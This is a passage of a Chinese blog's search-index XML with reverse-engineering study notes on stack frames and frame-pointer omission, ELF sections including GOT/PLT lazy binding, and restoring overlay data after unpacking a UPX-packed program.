eax,DWORD PTR [ebp+0x10]   0x0804843e &lt;+24&gt;:add    eax,edx   0x08048440 &lt;+26&gt;:pop    ebp   0x08048441 &lt;+27&gt;:ret    ；…… →  0x804847b &lt;main+40&gt;:    add    esp, 0xc</code></pre><h3 id="formit-frame-pointer参数"><a href="#formit-frame-pointer参数" class="headerlink" title="-formit-frame-pointer参数"></a>-formit-frame-pointer参数</h3><p>调试程序时发现，printf函数在执行中并没有改变EBP的值，比如说，在main函数调用了printf之后，EBP并没有改变，但是仍然存在着抬高栈顶的操作。《程序员的自我修养》中提到，gcc编译器有参数<code>-formit-frame-pointer</code>，可以取消帧指针，直接通过esp来计算相关变量的位置，这样多了一个ebp寄存器使用。经过编程尝试确实如此，通过<code>-formit-frame-pointer</code>编译后的函数汇编代码中不存在类似 <code>mov esp，ebp</code> 的操作。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Stack </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见逻辑段</title>
      <link href="/2020/03/01/%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%AE%B5/"/>
      <url>/2020/03/01/%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="text-code"><a href="#text-code" class="headerlink" title=".text .code"></a>.text .code</h2><p>代码段，程序编译后的机器指令往往被放在了代码段。</p><h2 id="data"><a href="#data" class="headerlink" title=".data"></a>.data</h2><p>数据段，初始化了的全局变量和局部静态变量往往放在数据段。</p><h3 id="为啥需要将代码与数据分开？"><a href="#为啥需要将代码与数据分开？" class="headerlink" title="为啥需要将代码与数据分开？"></a>为啥需要将代码与数据分开？</h3><ol><li>指令区域对进程来说是只读的，数据区域需要读写，可以分别设置两者的权限，防止指令被修改</li><li>现代CPU中L1 cache一般设计指令缓存与数据缓存，如此分开，可以提高cache的命中率</li><li>当程序中运行多个该指令集的副本时，物理内存中只需保存一份指令集，再将其映射到不同进程的虚存即可，即共享指令</li></ol><h2 id="bss"><a href="#bss" class="headerlink" title=".bss"></a>.bss</h2><p>未初始化的全局变量和局部静态变量一般放在bss段里。由于数据都未进行初始化，所以没有必要在文件中为其保留空间，.bss段只是为未初始化的全局变量和局部静态变量预留位置，它记录来所有未初始化的全局变量和局部静态变量的大小总和，在文件中不占用空间。</p><h2 id="rodata"><a href="#rodata" class="headerlink" title=".rodata"></a>.rodata</h2><p>只读数据段，还可以在语义上支持C++ 的const关键字。</p><h2 id="comment"><a href="#comment" class="headerlink" title=".comment"></a>.comment</h2><p>存放编译器版本信息。</p><h2 id="rel-text，-rel-data"><a href="#rel-text，-rel-data" class="headerlink" title=".rel.text，.rel.data"></a>.rel.text，.rel.data</h2><p>针对.text、.data段的重定位表。</p><h2 id="got与-plt"><a href="#got与-plt" class="headerlink" title=".got与.plt"></a>.got与.plt</h2><p>got表为了解决在动态链接的时候模块中有绝对地址引用的问题，采用了PIC地址无关代码技术，而这个技术的中心思想就是got表。模块内部的函数调用跳转、数据的访问都可以通过相对地址进行，模块外部的访问函数、数据时就用到了got表。got表中包含了每个变量所在的地址，该地址由链接程序进行维护。通过got表实现了模块外部数据的间接访问。</p><p>plt延时绑定技术，当函数第一次被用到时才进行符号查找，重定位。</p><pre><code class="x86asm">haha@plt:jmp *(haha@got)push npush moduleIDjump _dl_runtime_resolve</code></pre><p>在第一次调用haha时，<code>jmp *(haha@got)</code> 将跳转到下一条指令执行，此时<code>push n</code>将把haha在重定位表.rel.plt中的下表入栈，再压入moduleID，由_dl_runtime_resolve来完成符号解析与重定位工作，并把haha的实际存放到got表中。之后再调用时<code>jmp *(haha@got)</code> 将跳转到haha实际地址开始执行。<br>ELF中‘.got’存放全局变量引用地址，‘.got.plt’存放保存函数应用的地址。</p><p>绑定之后 <code>call test@plt</code> ,与 <code>call [test@got]</code> 执行效果相同。<br>ELF将GOT拆分成两个表“.got”和”.got.plt”,前者用来保存全局变量引用的地址，后者用来保存函数引用的地址。</p><h2 id="interp"><a href="#interp" class="headerlink" title=".interp"></a>.interp</h2><p>存放动态链接器的路径</p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>保存了动态链接器所需要的基本信息，如重定位表的位置，符号表的位置，共享对象初始化代码的地址等等</p><h2 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h2><p>保存了与动态链接相关的符号</p><h2 id="symtab"><a href="#symtab" class="headerlink" title=".symtab"></a>.symtab</h2><p>保存了该目标文件的所有符号的定义与引用</p><h2 id="init与-fini"><a href="#init与-fini" class="headerlink" title=".init与.fini"></a>.init与.fini</h2><p>.init段是一段属于共享对象的代码，装入共享对象时该代码将执行。例如，.init段由C++运行时系统用于调用.so 中的所有静态初始化函数。各个动态库的init执行顺序是按照依赖关系先后执行的，不是加载顺序。<br>.fini终止代码</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Section </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>壳壳壳</title>
      <link href="/2020/01/28/%E5%A3%B3%E5%A3%B3%E5%A3%B3/"/>
      <url>/2020/01/28/%E5%A3%B3%E5%A3%B3%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="Overlay附加数据"><a href="#Overlay附加数据" class="headerlink" title="Overlay附加数据"></a>Overlay附加数据</h1><p>Overlay数据,附加数据.数据被附加在PE文件后面,使用的时候打开PE文件本身直接读取就行,但系统在映射文件到内存的时候,因为附加数据相关信息不包含在PE头中,所以不会被映射进内存  </p><p>拿到程序,查壳UPX,两秒脱完,运行,失败!调试发现,在<code>ReadFileA</code>之后,检查数据时报错.使用PEStudy很快就找到了附加数据的起始地址<br><img src="./%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE%E8%B5%B7%E5%A7%8B%E5%9C%B0%E5%9D%80.png" alt="附加数据起始地址"><br>将附加数据复制粘贴到脱壳文件后的末尾就能成功运行了</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
